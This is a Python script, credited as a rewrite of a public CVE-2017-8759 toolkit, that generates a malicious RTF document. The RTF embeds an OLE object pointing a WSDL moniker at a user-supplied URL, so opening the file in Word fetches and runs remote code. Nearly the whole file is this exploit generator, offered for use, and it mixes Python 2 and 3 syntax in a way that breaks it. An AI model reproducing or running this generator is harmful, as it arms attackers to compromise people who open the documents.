import sys
import getopt
"From https://github.com/bhdresh/CVE-2017-8759/blob/master/cve-2017-8759_toolkit.py"
"Rewrite by Lz1y"

opts, args = getopt.getopt(sys.argv[1:], '-h-f:-u:', ['help', 'filename=', 'url='])
filename=''
docuri=''

def generate_exploit_rtf(docuri, filename):
    # Preparing malicious RTF
    s = docuri
    docuri_hex = "00".join("{:02x}".format(ord(c)) for c in s)
    docuri_pad_len = 714 - len(docuri_hex)
    docuri_pad = "0" * docuri_pad_len
    payload = "{\\rtf1\\adeflang1025\\ansi\\ansicpg1252\\uc1\\adeff31507\\deff0\\stshfdbch31505\\stshfloch31506\\stshfhich31506\\stshfbi31507\\deflang1033\\deflangfe2052\\themelang1033\\themelangfe2052\\themelangcs0\n"
    payload += "{\\info\n"
    payload += "{\\author }\n"
    payload += "{\\operator }\n"
    payload += "}\n"
    payload += "{\\*\\xmlnstbl {\\xmlns1 http://schemas.microsoft.com/office/word/2003/wordml}}\n"
    payload += "{\n"
    payload += "{\\object\\objautlink\\objupdate\\rsltpict\\objw291\\objh230\\objscalex99\\objscaley101\n"
    payload += "{\\*\\objclass Word.Document.8}\n"
    payload += "{\\*\\objdata 010500000200000008000000e2bae4e53e2231000000000000000000000a0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdfffffffefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff010000000003000000000000c000000000000046000000000000000000000000f02c1951c8e5d20103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000d8010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000020000000300000004000000050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0100000209000000010000000000000000000000000000008c010000c7b0abec197fd211978e0000f8757e2a00000000700100007700730064006c003d00" + docuri_hex + docuri_pad + "00ffffffff0000000000000000000000000000000000000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000}\n"
    payload += "{\\result {\\rtlch\\fcs1 \\af31507 \\ltrch\\fcs0 \\insrsid1979324 }}}}\n"
    payload += "{\\*\\datastore }\n"
    payload += "}\n"
    with open(filename,'w',encoding='utf-8') as f:
        f.write(payload)
    print("[+]Generated " + filename + " successfully")

if __name__=="__main__":

    for opt_name, opt_value in opts:
        if opt_name in ('-f', '--filename'):
            filename = opt_value

        if opt_name in ('-u', '--url'):
            docuri = opt_value

        if opt_name in ('-h', '--help') or (filename == '' and docuri == ''):
            print("[*] Help info")
            print("usage:%s -f filename - u url" % sys.argv[0])
            print("filename: output file name")
            print("url: http[s]://example.com/exploit.txt")
            exit()
    try:
        generate_exploit_rtf(docuri, filename)
    except Exception,e:
        print e
        print("[-]Generated Failed!Please check input.")

